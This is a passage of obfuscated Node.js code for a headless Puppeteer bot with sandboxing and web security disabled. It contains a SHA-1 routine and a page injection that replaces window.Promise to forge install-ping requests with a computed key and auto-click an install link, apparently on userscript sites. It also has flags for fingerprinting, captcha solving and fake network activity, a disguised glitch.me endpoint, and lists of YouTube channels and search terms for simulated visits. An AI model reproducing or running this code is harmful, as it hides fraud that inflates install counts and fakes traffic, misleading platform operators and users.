                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1239 + -0xd69 * -0x1 + -0x48 * -0x12 ? (this['block'] = P[0x1c30 * -0x1 + 0xa55 + 0x11eb], this['start'] = N - (0x1a9e + 0x3 * 0x67b + 0x2dcf * -0x1), this['hash'](), this['hashed'] = 0x20 * -0xc4 + 0x4 * 0x5c9 + -0x1 * -0x15d) : this['start'] = N;
                }
                return this['bytes'] > 0x2168b8f8 + 0x36384468 + -0xa85f029f * -0x1 && (this['hBytes'] += this['bytes'] / (-0x14407db24 + 0x85f7c3e4 * -0x1 + 0x4 * 0xb27fe7c2) << -0x2391 * -0x1 + 0xb65 * -0x3 + -0x162, this['bytes'] = this['bytes'] % (-0x3126e850 + 0x9738e468 + -0xebf4 * -0xa702)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x181f + -0xb08 * 0x2 + -0x107 * 0x2;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x6 * -0xce + 0x1a4c + -0x4 * 0x55a] = this['block'], J[K >> -0x102c + 0x877 * 0x3 + -0x937] |= x[-0x36d * 0x5 + -0x5 * 0x135 + -0x1 * -0x172d & K], this['block'] = J[-0x1e1 * -0x11 + -0xceb * 0x1 + 0x12f6 * -0x1], K >= -0x59f + 0x24dc + -0xa57 * 0x3 && (this['hashed'] || this['hash'](), J[0x4 * -0x2cc + -0xf2 + 0xc22] = this['block'], J[-0x1 * 0xadd + 0x43f + 0x6ae] = J[-0x1453 + -0x18a5 * -0x1 + -0x1 * 0x451] = J[-0x415 + -0x20b2 + 0x24c9] = J[-0xc32 + 0x2459 + -0x2 * 0xc12] = J[0xf8e + -0x1faf + 0x1025] = J[-0x3 * 0x33b + 0x3 * -0xae3 + 0x2a5f] = J[0x3 * -0x90d + -0xf71 * -0x1 + 0xbbc] = J[0x12ca + -0x1d75 * 0x1 + 0xab2] = J[0x22aa + -0x1c32 + -0x670] = J[-0x151b + 0x2 * 0xd13 + -0x281 * 0x2] = J[-0x1422 * -0x1 + -0x1866 + 0x44e] = J[-0x20c + -0x1 * -0x170f + -0x53e * 0x4] = J[0x1 * 0x36d + 0x12d5 + -0x1636] = J[-0xbab + 0xa31 + 0x187] = J[0x17 * 0x146 + 0x546 + -0x2282] = J[0x2386 + -0x1882 + -0xaf5] = -0x1 * -0x201e + -0x1302 + -0xd1c), J[0x7dd + 0x1811 + -0x1fe0] = this['hBytes'] << -0x1fe7 + 0x1aa5 + 0x545 * 0x1 | this['bytes'] >>> -0x901 * -0x1 + 0x3 * -0x94d + -0x1f * -0x9d, J[-0x20b3 + 0x1238 + 0xe8a] = this['bytes'] << -0xeb1 + 0x8 * -0x15d + 0x199c, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x6 * 0x2a5 + 0x4 * 0x34f + -0x162 * 0x15; J < 0xdfb + -0x1 * 0x2665 + -0xd3 * -0x1e; ++J)
                K = Q[J - (0x266 * 0x4 + -0x5a1 + -0x2c * 0x17)] ^ Q[J - (-0xa98 + -0x6ad * -0x4 + -0x2a * 0x62)] ^ Q[J - (-0xca * -0x11 + 0x7 * -0x4bb + -0x185 * -0xd)] ^ Q[J - (0x24f4 + -0xcef + -0x1 * 0x17f5)], Q[J] = K << 0x170f + -0x3 * 0x89b + 0x2c3 | K >>> -0x247b + -0xb57 + 0x2ff1;
              for (J = -0x20c2 + -0x1f83 + -0x1 * -0x4045; J < 0x1 * 0xa47 + 0x5e * 0x2f + -0x1b75; J += -0x1181 * 0x1 + -0x67 * 0x49 + 0x6b3 * 0x7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x6 * 0xf8 + -0x260 * -0x4 + -0x3ab | L >>> -0x198b + 0x2 * -0x4af + -0x12 * -0x1f2) + (M & N | ~M & O) + P + (-0x8c * -0x460ee5 + -0x56a1d753 + 0x8ad42bb0) + Q[J] << 0x2 * -0x122e + 0x1c37 + 0x825) << 0x26a + 0x362 + -0x5c7 | P >>> -0x736 + 0x26f7 + -0x1fa6) + (L & (M = M << 0x4e8 + -0x7 * 0xdb + 0x1 * 0x133 | M >>> 0xb * -0x113 + 0x3d5 + 0x1f * 0x42) | ~L & N) + O + (0x39785229 * 0x2 + 0x23 * 0x2ea934b + -0x1 * 0x7e804dfa) + Q[J + (0xcbd + -0x1 * -0x255d + -0x3219)] << 0x2588 + 0xa7 * 0x30 + -0x44d8 * 0x1) << -0x69b + -0x1322 + 0x19c2 | O >>> -0x1 * -0xb6f + -0x2536 + 0x19e2) + (P & (L = L << 0x1d02 + -0x13 * -0x5d + -0x23cb | L >>> 0x1e3d * 0x1 + -0x570 + -0x241 * 0xb) | ~P & M) + N + (-0x17 * 0x28aed69 + 0x2 * 0x111edd3a + 0x2 * 0x396009ca) + Q[J + (0x1e1e + -0x1d1b + -0x101)] << 0xeea * 0x1 + 0x1b33 + 0x1 * -0x2a1d) << 0x6b8 + -0x1a * -0x102 + -0x20e7 | N >>> -0x2 * -0x9db + 0x2db * -0x1 + -0x10c0) + (O & (P = P << -0x247 * 0x3 + 0x16db * 0x1 + -0xfe8 | P >>> -0x57c + 0x34e + 0x230) | ~O & L) + M + (-0x1 * -0xa7c0aac1 + 0x269 * 0x12c90b + -0x7a84bcab) + Q[J + (-0x2127 + 0xacc * -0x1 + 0x296 * 0x11)] << 0x10c3 + 0x2682 + -0x1 * 0x3745) << -0x623 * 0x3 + -0x50 * -0x53 + -0x1 * 0x782 | M >>> -0x7ce * -0x2 + 0x26fc + -0x179 * 0x25) + (N & (O = O << -0x67b + -0x2149 * 0x1 + 0x27e2 | O >>> 0x4 * -0x16f + 0x14ce * 0x1 + 0x1e2 * -0x8) | ~N & P) + L + (-0x1b07c14 * -0x31 + -0x61a6a597 + -0x1a5857d7 * -0x4) + Q[J + (0xd6 * -0x1f + 0x1509 + 0x4e5)] << -0x269 * -0xf + -0x1a95 + -0x992, N = N << -0x6 * -0x1aa + -0x1463 + 0xa85 * 0x1 | N >>> -0x134e + -0x8ee + -0xa * -0x2d3;
              for (; J < -0x1 * 0x2201 + 0x131a + 0xf0f; J += -0x693 + 0x10c8 + -0xa30)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1c9e * 0x1 + 0x5b * 0x1 + -0x44 * 0x6d | L >>> 0x270 + -0x9ee + -0x799 * -0x1) + (M ^ N ^ O) + P + (0x72722544 + 0x8b3b0635 + 0x4 * -0x23b4cff6) + Q[J] << -0x7 * -0x409 + 0x3e3 + -0x2022) << 0x1931 * 0x1 + 0x2 * 0x7cf + 0x17 * -0x1c6 | P >>> 0x10b * 0x17 + 0xd * 0x1a8 + -0x2d6a * 0x1) + (L ^ (M = M << 0x11f8 + 0x1215 + -0x23ef | M >>> 0x1a * -0x170 + 0x23ca + 0x198) ^ N) + O + (0x41b79412 + -0x74a1f930 + 0xa1c450bf) + Q[J + (0x4 * -0x7c3 + 0xf89 + -0x52c * -0x3)] << 0xb0c + 0x1a0d + -0x2519) << -0x21ac + -0xea5 + -0x182b * -0x2 | O >>> -0x270 + -0x16eb * 0x1 + 0x1976 * 0x1) + (P ^ (L = L << -0xb5f + -0x1af8 * -0x1 + -0x1 * 0xf7b | L >>> 0x25a7 + -0x698 + -0x1f0d * 0x1) ^ M) + N + (-0xc3f9b01e + 0x292bb6ef + 0x109a7e4d0) + Q[J + (-0xec5 + -0x2a5 + 0x116c)] << -0x1415 + 0x577 * 0x5 + -0x26a * 0x3) << -0xd06 + -0x5fb * 0x5 + 0x1579 * 0x2 | N >>> 0x140b + 0x1de4 + -0x1 * 0x31d4) + (O ^ (P = P << -0x32 * 0x4 + 0x2e6 + -0x200 | P >>> -0x22b6 + 0x91b + 0x199d) ^ L) + M + (0x5b49 * 0x1e38f + -0x4028d5de + 0x8 * 0x52a117) + Q[J + (-0x101f * -0x2 + -0xcd1 * 0x3 + 0x2 * 0x31c)] << -0x1626 + 0x1 * 0x7bb + 0xe6b * 0x1) << 0x2376 + 0x1 * 0xe4f + -0x31c0 | M >>> -0x2671 * -0x1 + -0x2045 + -0x611 * 0x1) + (N ^ (O = O << -0x71 * -0x13 + 0x7bc + -0x1001 | O >>> 0x43 * 0x35 + -0x234e + 0xb * 0x1f3) ^ P) + L + (0x129459f * 0x81 + 0x1 * 0x5d8aa6e5 + -0x847cd063) + Q[J + (-0xc1c + -0x11b4 + 0x1dd4)] << 0x6ed * 0x5 + -0x1cef + -0x5b2, N = N << 0x3 * 0x11e + -0x5 * 0x3e4 + 0x1038 | N >>> 0x7fe + 0x17b0 + -0x4 * 0x7eb;
              for (; J < 0x3f + -0x1a * 0xde + 0x1689; J += -0x2 * -0x1345 + -0x19e0 + -0xca5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x13ab + -0x12c4 + 0x2674 | L >>> -0xa57 * -0x1 + 0x1428 + -0x4 * 0x799) + (M & N | M & O | N & O) + P - (0x8d343fd7 + 0xe2ded1f + 0x4cced * -0x8da) + Q[J] << -0x167a + 0x4a9 * 0x3 + 0x87f) << -0x5 * 0x729 + 0x1c4a + 0x788 | P >>> -0x1212 + 0x3b * 0x9e + -0x123d) + (L & (M = M << -0x3 * -0xae1 + -0x41d + -0x24 * 0xca | M >>> 0x6af + 0x471 * -0x3 + 0x2e * 0x25) | L & N | M & N) + O - (0x8ea3ef7c + 0xca0337ea + 0x56 * -0x2b1e4e3) + Q[J + (0x2 * -0x752 + 0x1ebc + -0x1017)] << 0x1 * -0x23e2 + -0x3c * 0x5 + -0x3e * -0x99) << 0xfd4 + 0x90a + -0x18d9 | O >>> -0x953 + -0x169f * -0x1 + -0x133 * 0xb) + (P & (L = L << 0x1de2 + 0x139d + -0x3161 | L >>> 0xd6 * 0x19 + -0x140e * 0x1 + 0x1 * -0xd6) | P & M | L & M) + N - (0x25 * 0x5bf3f66 + 0x1 * 0x7f77c123 + -0x202c20d * 0x71) + Q[J + (-0xcf0 + 0x4 * 0x3a1 + 0xc9 * -0x2)] << 0x113b + 0x1993 + 0x1 * -0x2ace) << -0x24c9 + -0x1fc5 + 0x4493 | N >>> -0x1343 + 0xa1f + 0x107 * 0x9) + (O & (P = P << 0x189b * 0x1 + 0x150a + -0x2d87 | P >>> 0xe6c + -0x1894 + -0x2 * -0x515) | O & L | P & L) + M - (-0x45a79e4e + 0x6965ff16 + -0x577a * -0xe1c6) + Q[J + (0x1aff * -0x1 + -0x3 * -0xc97 + -0x1 * 0xac3)] << -0x33d + -0x16e1 + -0x1a1e * -0x1) << -0x12f * -0x19 + 0x7a + -0x1e0c * 0x1 | M >>> 0x33 * -0xa1 + -0x2521 * -0x1 + -0x7 * 0xb5) + (N & (O = O << 0xd3d * -0x1 + -0x1cae + 0x2a09 | O >>> -0xb8a + -0x199c + 0x2528) | N & P | O & P) + L - (-0xde9cbae3 + 0x955cb8f0 + 0xba244517) + Q[J + (0x2 * 0x80d + -0x1 * 0x1623 + -0x1 * -0x60d)] << -0x3d7 + -0x1 * -0xe5f + -0xa88, N = N << 0x189b + 0x1d06 + -0x3583 | N >>> -0xd6d * -0x1 + 0x2225 + -0x2f90;
              for (; J < -0x1c * 0x4c + -0x11 * 0x72 + 0x1032; J += -0x1671 + -0xed + 0x1763)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x16ac + 0x985 * 0x1 + -0x1 * -0xd2c | L >>> 0x11c * -0x19 + 0x11 * 0xe2 + 0xcd5) + (M ^ N ^ O) + P - (-0x2775b9e0 + -0x3 * 0x1758a9d1 + -0x332c38f * -0x33) + Q[J] << -0xaa2 * -0x2 + -0x13a2 + -0x1a2) << 0x370 * 0xa + 0x5dd + 0x1a * -0x18c | P >>> -0x7b0 + 0x2d4 + 0x4f7) + (L ^ (M = M << -0x1 * 0x9b7 + -0x79d + -0x16 * -0xcb | M >>> 0x497 + -0xd6 * -0xe + -0x1049) ^ N) + O - (0x3cfaca86 + -0x4e7b1dbe + -0x2f * -0x1835a3e) + Q[J + (-0x1 * 0x1931 + -0xd23 * -0x1 + 0xc0f)] << 0x1fa4 + 0x1 * 0x13c1 + -0x3365) << -0x1 * -0x706 + 0xd97 + -0x1498 | O >>> 0x1ae3 * -0x1 + 0x1 * 0x2146 + -0x648) + (P ^ (L = L << 0x15ce * 0x1 + 0x15f0 + -0x2ba * 0x10 | L >>> 0x6b * -0x1 + -0x18dd + 0x194a) ^ M) + N - (-0x6416dc37 + -0x50f084 * -0x2e + 0x8b28e2a9) + Q[J + (0x207f + -0x17 * -0x9f + -0x2ec6)] << -0x132f + 0x1 * -0x1e16 + -0x3145 * -0x1) << -0x13ee + 0x12cf + 0x124 | N >>> 0x6 * -0x67 + -0x1e22 + -0x283 * -0xd) + (O ^ (P = P << -0x20e9 + 0x26f5 + -0x5ee | P >>> -0x1 * 0xdbd + -0x2297 + 0x2e * 0x10d) ^ L) + M - (-0x100144cd + 0x1 * -0x3f207ec5 + 0x9ad * 0xdb82c) + Q[J + (0x5ea * 0x2 + 0x1de8 + -0x29b9)] << -0x137 * -0x1b + -0xc4f * -0x3 + -0x4b * 0xee) << -0x21d6 + 0xabe + 0x171d | M >>> 0x1447 + -0xf * -0x35 + 0x1747 * -0x1) + (N ^ (O = O << 0x11 * -0x165 + 0x336 * -0x7 + 0x2e4d | O >>> -0x239f + 0x1 * 0xb25 + 0x187c) ^ P) + L - (-0x878e06b + -0x3b4a * -0x8ff3 + 0x1cbf8157) + Q[J + (-0xdd6 * -0x1 + -0x1 * -0x724 + -0x14f6)] << 0xb3f * 0x3 + 0x7 * 0x51b + -0x457a * 0x1, N = N << -0x5ec + 0x433 + 0x9d * 0x3 | N >>> 0x141b + -0x2134 + -0x37 * -0x3d;
              this['h0'] = this['h0'] + L << -0x2 * 0x18e + 0x1 * -0x11b5 + 0x14d1, this['h1'] = this['h1'] + M << -0x4 * -0xe + 0x1b57 + -0x1b8f, this['h2'] = this['h2'] + N << 0x1145 * 0x2 + -0xd0 * 0x3 + -0x201a, this['h3'] = this['h3'] + O << -0x190d + -0x1867 + 0x3174, this['h4'] = this['h4'] + P << 0x51b + -0x56 * 0x2e + 0xa59;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x12ee + 0x70a + 0xc00 & -0x1650 + -0x41c * 0x8 + 0x373f] + w[J >> 0xe * -0x4d + 0xc64 + -0x19e * 0x5 & -0x7 * 0x241 + -0xdcc + 0x2 * 0xed1] + w[J >> 0x1b02 + 0x171 * -0xe + -0x8 * 0xd8 & 0x1ca8 + -0x2262 + -0x5c9 * -0x1] + w[J >> -0x73b + 0x764 * -0x4 + 0x24db & 0x6a * 0x29 + -0x173b + -0x10 * -0x65] + w[J >> 0x188e + -0x2529 * 0x1 + 0xca7 & 0x22cf + -0x2e0 * -0xb + -0x4260] + w[J >> -0xdc * 0x19 + 0x1714 + 0x50 * -0x5 & -0x253b + -0x55b + 0x1 * 0x2aa5] + w[J >> 0x4a * -0x65 + -0xa6e + 0x27a4 & 0x211 + 0x62 * 0x1 + -0x264] + w[-0x201b + 0x1 * 0x96d + 0x16bd & J] + w[K >> 0x2363 + 0x6c + 0x2bf * -0xd & -0x153c + 0x1 * -0x1da5 + 0x32f0] + w[K >> 0x1139 + -0x37 * 0xd + -0x16f * 0xa & -0x13b3 + -0x176 * 0xb + -0x11ea * -0x2] + w[K >> -0x26ed + 0x1 * 0x1367 + -0x1 * -0x139a & 0x9c4 * 0x2 + -0x37 * -0x9e + -0xaaf * 0x5] + w[K >> 0x9cd * -0x3 + 0x1eb5 + -0x13e & -0x4db + -0x26 + -0x12 * -0x48] + w[K >> 0x13 * 0x9a + 0x1b41 + -0x26a3 & 0xcb2 + 0xdc8 + 0x1a6b * -0x1] + w[K >> -0x1b83 + 0xae6 + 0x10a5 & -0xd26 + -0xf * 0x221 + 0x2d24] + w[K >> -0x11c * -0x1f + -0x6fd + -0xab * 0x29 & 0xb * -0x2f5 + 0x2 * -0x11b6 + 0xd9a * 0x5] + w[-0x9ad + 0x36e + -0x3 * -0x21a & K] + w[L >> -0x166c + 0x19 * -0x6e + 0x2146 & 0x935 + -0x20b9 + 0x4b7 * 0x5] + w[L >> -0x6d + 0x2 * -0x1064 + 0x214d & -0xde * 0x2d + -0x22d6 + 0x49eb] + w[L >> -0x3 * 0x994 + -0x1 * -0x4b5 + 0x16b * 0x11 & 0xb4f + 0x9 * 0x457 + -0x324f] + w[L >> 0x58d + -0x7a * 0x38 + -0x1 * -0x1533 & 0x236d + -0x1ab * -0x17 + -0x49bb] + w[L >> -0x205d * -0x1 + -0x7 * -0x101 + -0x2758 & 0x57 * -0x49 + 0x1bc4 + 0x35 * -0xe] + w[L >> 0x126e + 0x7 * 0x4a2 + -0x32d4 * 0x1 & -0xdde * -0x2 + 0x1019 + 0x1a * -0x1af] + w[L >> 0x7 * -0x15 + -0x452 + 0x4e9 & 0x175d + 0x171 + -0x18bf] + w[-0x765 + -0x8d8 + 0x104c & L] + w[M >> -0x1db + -0x2 * 0x354 + -0x89f * -0x1 & 0xa7 * -0x1b + 0x42d * -0x3 + 0x1e33] + w[M >> -0x1 * -0x7c3 + -0x1 * -0x61 + -0x80c & -0x1173 + -0x3ba * -0x6 + -0x4da] + w[M >> 0x301 * -0x1 + -0x20b * -0xa + 0x1 * -0x1159 & -0x2014 + 0x1ef * -0x3 + 0x25f0] + w[M >> -0x1 * -0x54d + -0x1 * -0xa25 + -0x7b1 * 0x2 & 0x1bcd + -0x10c * 0xa + -0x1146] + w[M >> -0x648 * -0x1 + 0x140a + 0x3b * -0x72 & 0x7 * 0x48f + 0x1e68 + 0x1 * -0x3e42] + w[M >> -0x396 + 0x1d2b + -0x198d & -0xbef + -0x203e + -0x254 * -0x13] + w[M >> -0x13db + 0xfcc + -0x413 * -0x1 & -0x709 + 0x1c77 + -0x155f] + w[0xb * -0x311 + -0x314 + 0x4e * 0x79 & M] + w[N >> 0x16b4 + 0x88f + 0x2d5 * -0xb & -0xf * -0x7f + 0xef8 + -0x165a] + w[N >> 0x8f7 + -0xb2a * -0x1 + -0x1409 & -0x10 * -0x1dd + 0x1 * -0xef5 + -0xecc] + w[N >> -0x14ff + 0x610 + 0xf03 & 0x453 + 0x25 * -0xa7 + -0x13df * -0x1] + w[N >> 0x1a * -0x159 + -0x2 * 0x922 + 0x355e & -0x7e4 * -0x4 + -0x214b + 0x1ca] + w[N >> 0x15ea + 0x1b2a + -0x3108 & -0x3a * 0x5 + 0x1 * -0x8bf + 0x9f0] + w[N >> -0x88b * -0x2 + -0x129b + 0x18d & 0x5e + -0x33a * -0xb + -0x23cd] + w[N >> -0x1f99 + -0x24f * -0x6 + 0x11c3 & -0x25ad + -0x1 * 0x220c + 0x47c8 * 0x1] + w[0x179a + 0x7fe + -0x1f89 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x2 * 0x49 + -0x1664 + 0x1e * 0xbb & -0x11fd + -0xcfb + -0xa7 * -0x31,
                J >> -0x26e2 + -0x3d * -0x5b + -0x5c1 * -0x3 & 0x2559 + 0x1d35 + -0x50b * 0xd,
                J >> 0x31a * 0x4 + -0x3 * -0x7c9 + -0x23bb & -0x6c3 * -0x3 + 0xf * 0x36 + -0x1674,
                0x3b8 + -0x3 * 0xb98 + 0x200f & J,
                K >> -0x1fd8 + 0x1 * -0x18cb + -0x135 * -0x2f & -0xf99 + -0xda * -0x2d + -0x15ba,
                K >> 0x22dd + -0x2 * -0x4cf + 0x89 * -0x53 & -0x79 * -0x1 + -0xc33 + 0xcb9,
                K >> 0x1240 + 0x1 * -0x14a5 + 0x26d * 0x1 & -0x1976 + -0x709 * 0x1 + 0x6 * 0x595,
                -0x1549 + -0x1eb7 + 0x34ff & K,
                L >> 0x21fc + -0x7 * -0x471 + 0x40fb * -0x1 & 0x7f * -0xc + 0x1c19 + -0x2 * 0xa93,
                L >> -0x9 * 0x255 + -0x12a + -0x79 * -0x2f & 0x509 + -0x883 * 0x2 + 0x4 * 0x33f,
                L >> -0xbf1 * -0x1 + 0x21ce + 0x1 * -0x2db7 & -0x23b7 + -0x1 * -0x170d + 0xda9,
                0x35 * 0x5 + 0x246b * 0x1 + 0xb7 * -0x33 & L,
                M >> 0x15fa + -0x6a1 + 0x37 * -0x47 & 0xb9 + 0x1 * 0x4a7 + -0x461,
                M >> 0x74 + -0xa59 * 0x1 + 0x1 * 0x9f5 & -0x25df + -0xb * -0x1d7 + -0x12a1 * -0x1,
                M >> -0xd6b + 0x1535 + -0x6 * 0x14b & -0xf8d + -0x1 * 0x87a + 0x1 * 0x1906,
                0x1 * -0x241c + -0x1424 + 0x393f & M,
                N >> 0x12a + 0x1 * 0xaad + 0x1f * -0x61 & 0x1ecd + -0x1438 * -0x1 + 0x2 * -0x1903,
                N >> -0x4 * 0x4e1 + -0x1861 + 0xea7 * 0x3 & -0x906 + -0x1df1 + -0x1 * -0x27f6,
                N >> 0x1965 + 0x2ee + -0x1c4b & 0x66d + 0x1 * -0x1b9d + 0x1 * 0x162f,
                0x1ede + -0x2351 + 0x572 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x5 * -0x691 + -0x2a5 + 0x6 * 0x5ed), (K = new DataView(J))['setUint32'](-0x1 * 0x2685 + -0x72f + 0x2db4, this['h0']), K['setUint32'](-0x1 * 0x26dc + -0x18 * -0x145 + -0x8 * -0x10d, this['h1']), K['setUint32'](-0x2162 + 0x1 * -0x8d6 + 0x2a40, this['h2']), K['setUint32'](-0x1a3a + 0x1 * -0x1a69 + -0x1 * -0x34af, this['h3']), K['setUint32'](-0x6 * 0x523 + -0x1708 + 0x35ea, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x2263 + -0x2178 + -0xeb];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x2182 + 0x18ff + -0x1 * -0x883;
            J[-0x2b * -0xcd + 0xa64 + 0x99 * -0x4b]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x4c * 0x4c + -0xa75 + 0x2105] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1281 * -0x1 + -0x17ba + 0x70a * 0x6), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x7e9 + -0x88e + 0x1078;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x8fa + -0x20fb + 0x1ddd), Promise['resolve'](-0x1612 + 0x10e0 + 0x533);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x20d2 + 0x26f8 + -0x47ca; j < 0x1d0b + -0x211c + 0x412; j++)
    i();
}

function a() {
  const bm = [
    'rKLFg0vxbx84WRe',
    'CMfUzg9T',
    'ASknW7xdImkvj8keWRFdNHu',
    'j_fe6PfxW4',
    'V3NxxpUUfW',
    '-chat-gpt-',
    'easyfork.o',
    'enuserjs.o',
    'bObEme2BDO',
    'VSvA4rCe-4',
    'zwDYB3vUzc5MDq',
    'aSowoSomn8oN',
    'y2HPBgroB2rLCW',
    'cGe-Mpw_F1',
    'rN1nh2jVpavNW6W',
    'Ahr0Chm6lY9NCG',
    'https://gr',
    'headers',
    'nCoJuuJcObNdRs1eWPW',
    'WRhdNhldJ8oeuColW45kW6G',
    'qw5KCM9PzcaXma',
    'navigate',
    'ymkqWOtcOb3dRG',
    '\x20Chrome/10',
    'lCknDJz9qGz3fee',
    'FHbQta/cSr3dHcZdTq',
    'Client_(BE'
  ];
  a = function() {
    return bm;
  };
  return a();
}
const NETWORK_PATIENCE = -0x1cd * -0xe + 0x4 * -0x236 + 0x5 * 0x2fa + (-0xc * 0xff + -0x334 + 0x1ae0) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0xe65 + -0x82 + 0xeea) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1c5a + -0x369 + -0x5 * 0x4fd; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 